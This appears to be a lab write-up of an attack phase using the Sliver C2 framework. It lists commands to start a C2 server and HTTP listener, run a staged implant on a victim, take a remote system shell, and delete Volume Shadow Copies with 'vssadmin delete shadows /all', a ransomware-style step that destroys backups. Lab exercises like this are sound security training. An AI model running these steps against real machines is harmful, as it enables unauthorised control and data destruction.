 Attack

With the environment prepared and access to the victim machine confirmed, I proceeded to launch the attack phase using the Sliver C2 framework. The implant used in this phase was created during a previous lab and is already staged on the victim.


 Launch the Sliver server
```bash
sliver-server
```
[Launch Sliver](./screenshots/Launch%20sliver.png)
 
 Run HTTP listner
```bash
http
```
 On the victim machine execute the implant
```powershell
./NEW_SHAKEDOWN (#You'll have to navigate to directory, or specify path)
```

 Return to the attacker machine and check for an incoming session
```bash
sessions
```
 Interact with the live session
```bash
 use <session_id>
```
 Drop to system native command prompt 
```bash
shell(#When Prompted 'are you an adult?' type Y) 
```
 Verify active sysytem shell
```bash
whoami
```
 Run command to simulate volime Shadow Copy deletion
```bash
vssadmin delete shadows /all
```
